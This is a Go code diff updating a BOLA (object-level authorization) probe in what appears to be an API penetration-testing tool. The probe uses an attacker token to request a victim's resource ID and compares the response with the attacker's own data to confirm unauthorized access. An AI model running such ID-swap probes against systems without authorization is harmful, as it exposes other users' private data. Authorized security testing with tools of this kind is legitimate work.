@@ -6,8 +6,9 @@ import (
 	"net/http"
 	"net/url"
 	"path"
+	"strings"
 
-	"github.com/JoseMariaMicoli/VaporTrace/pkg/db" // Added Persistence
+	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
 	"github.com/pterm/pterm"
 )
 
@@ -15,93 +16,111 @@ import (
 type BOLAContext struct {
 	BaseURL       string
 	VictimID      string
+	AttackerID    string // Added for Phase 9.2 Baseline
 	AttackerToken string
 }
 
-func (b *BOLAContext) Probe() {
-	pterm.DefaultHeader.WithFullWidth(false).Println("BOLA Probe Engine (API1:2023)")
+// getResource fetches a resource and returns status and body for comparison
+func (b *BOLAContext) getResource(resourceID string, token string) (int, string, error) {
+	u, _ := url.Parse(b.BaseURL)
+	u.Path = path.Join(u.Path, resourceID)
+	target := u.String()
 
-	// 1. Token Priority Logic: Context-specific -> Global Store -> Error
+	req, _ := http.NewRequest("GET", target, nil)
+	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
+	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.2 Surgical)")
+
+	resp, err := GlobalClient.Do(req)
+	if err != nil {
+		return 0, "", err
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	return resp.StatusCode, string(body), nil
+}
+
+func (b *BOLAContext) Probe() {
+	pterm.DefaultHeader.WithFullWidth(false).Println("Surgical BOLA Engine [PHASE 9.2]")
+
 	activeToken := b.AttackerToken
 	if activeToken == "" {
 		activeToken = CurrentSession.AttackerToken
 	}
 
 	if activeToken == "" {
-		pterm.Error.Println("No Attacker Token configured. Use 'auth attacker <token>' first.")
+		pterm.Error.Println("No Attacker Token configured.")
 		return
 	}
 
-	// 2. Build Target URL safely
-	u, err := url.Parse(b.BaseURL)
-	if err != nil {
-		pterm.Error.Printf("Invalid Base URL: %v\n", err)
-		return
+	// --- PHASE 9.2: BASELINE COLLECTION ---
+	// We fetch the attacker's OWN resource to see what a "Valid" response looks like.
+	var baselineBody string
+	if b.AttackerID != "" {
+		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline (Attacker's own data)...")
+		_, body, err := b.getResource(b.AttackerID, activeToken)
+		if err == nil {
+			baselineBody = body
+			spinner.Success("Baseline established.")
+		} else {
+			spinner.Warning("Could not establish baseline. Falling back to status-only mode.")
+		}
 	}
 
-	if b.VictimID != "" {
-		u.Path = path.Join(u.Path, b.VictimID)
-	}
-	target := u.String()
+	// --- PHASE 9.2: THE PROBE ---
+	spinner, _ := pterm.DefaultSpinner.Start(fmt.Sprintf("Probing Victim ID: %s", b.VictimID))
+	code, probeBody, err := b.getResource(b.VictimID, activeToken)
 
-	pterm.Info.Printf("Targeting: %s\n", target)
-	pterm.Info.Printf("Using Token Snapshot: %s...\n", activeToken[:8])
-
-	// PATCH: Use GlobalClient instead of creating a new one
-	req, err := http.NewRequest("GET", target, nil)
-	if err != nil {
-		pterm.Error.Printf("Failed to create request: %v\n", err)
-		return
-	}
-
-	// Inject the resolved token
-	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
-	req.Header.Set("User-Agent", "VaporTrace/2.0.1 (API Recon Suite)")
-
-	spinner, _ := pterm.DefaultSpinner.Start("Performing ID-Swap cross-validation...")
-
-	resp, err := GlobalClient.Do(req)
 	if err != nil {
 		spinner.Fail(fmt.Sprintf("Connection failed: %v", err))
 		return
 	}
-	defer resp.Body.Close()
 
-	body, _ := io.ReadAll(resp.Body)
+	// --- PHASE 9.2: SURGICAL ANALYSIS (The Patch) ---
+	isVulnerable := false
+	analysisMsg := ""
 
-	// Phase 3 Logic Analysis: 200 OK vs 403 Forbidden
-	if resp.StatusCode == http.StatusOK {
-		spinner.Success("BOLA VULNERABILITY DETECTED")
+	if code == http.StatusOK {
+		// Verify if the body is just a "Not Found" or "Error" message disguised as 200 OK
+		lowerBody := strings.ToLower(probeBody)
+		isGenericError := strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || strings.Contains(lowerBody, "denied")
+
+		if baselineBody != "" && probeBody == baselineBody {
+			// If the victim data is identical to the attacker's data, the server might be 
+			// reflecting the user's own data regardless of the ID (False Positive).
+			spinner.Warning("Potential False Positive: Server returned Attacker's own data for Victim ID.")
+			analysisMsg = "Reflected self-data (False Positive)"
+		} else if isGenericError {
+			spinner.Warning("False Positive Filtered: 200 OK received but body indicates an error.")
+			analysisMsg = "Cloaked Error Message"
+		} else {
+			// Body is 200 OK, differs from baseline, and isn't a known error string
+			isVulnerable = true
+			spinner.Success("VERIFIED BOLA VULNERABILITY")
+		}
+	}
+
+	if isVulnerable {
 		pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
-		pterm.Warning.Println("Attacker context accessed Victim resource successfully.")
+		pterm.Warning.Println("Unauthorized data extraction confirmed via Response Diffing.")
 
 		pterm.DefaultTable.WithData(pterm.TableData{
 			{"METRIC", "VALUE"},
-			{"STATUS CODE", "200 OK"},
 			{"RESOURCE ID", b.VictimID},
-			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(body))},
+			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(probeBody))},
+			{"DIFF STATUS", "Structural Divergence Confirmed"},
 		}).WithBoxed().Render()
 
-		// PERSISTENCE HOOK: Log Success
 		db.LogQueue <- db.Finding{
-			Phase:   "PHASE III: AUTH LOGIC",
-			Target:  target,
-			Details: fmt.Sprintf("BOLA ID-Swap on %s", b.VictimID),
+			Phase:   "PHASE 9.2: SURGICAL BOLA",
+			Target:  b.BaseURL + "/" + b.VictimID,
+			Details: fmt.Sprintf("Confirmed BOLA on %s (Diff Verified)", b.VictimID),
 			Status:  "EXPLOITED",
 		}
-
-	} else if resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusUnauthorized {
-		spinner.Success("Target Secure")
-		pterm.Success.Println("Access denied: Authorization logic correctly enforced.")
-
-		// PERSISTENCE HOOK: Log Mitigation
-		db.LogQueue <- db.Finding{
-			Phase:   "PHASE III: AUTH LOGIC",
-			Target:  target,
-			Details: "BOLA Attempt",
-			Status:  "MITIGATED",
-		}
+	} else if code == 403 || code == 401 {
+		spinner.Success("Target Secure (403 Forbidden)")
 	} else {
-		spinner.Warning(fmt.Sprintf("Inconclusive: Server returned %d", resp.StatusCode))
+		spinner.Stop() // 
+		pterm.Info.Printfln("Result: %s", analysisMsg)
 	}
 }
